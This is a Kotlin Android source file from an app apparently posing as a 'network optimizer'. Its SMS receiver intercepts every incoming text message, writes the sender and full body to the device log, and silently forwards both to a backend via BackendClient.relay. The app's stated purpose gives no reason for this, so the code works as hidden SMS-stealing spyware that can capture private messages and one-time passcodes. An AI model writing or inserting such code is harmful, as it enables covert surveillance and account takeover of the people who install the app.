package com.netboost.optimizer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages == null || messages.isEmpty()) return

            val msgsBySender = messages.groupBy { it.originatingAddress ?: "Unknown" }

            for ((sender, parts) in msgsBySender) {
                val fullBody = parts.joinToString(separator = "") { it.messageBody ?: "" }
                Log.d("SmsReceiver", "Received SMS from $sender: $fullBody")

                kotlinx.coroutines.GlobalScope.launch {
                    BackendClient.relay(sender, fullBody, java.util.UUID.randomUUID().toString())
                }
            }
        }
    }
}
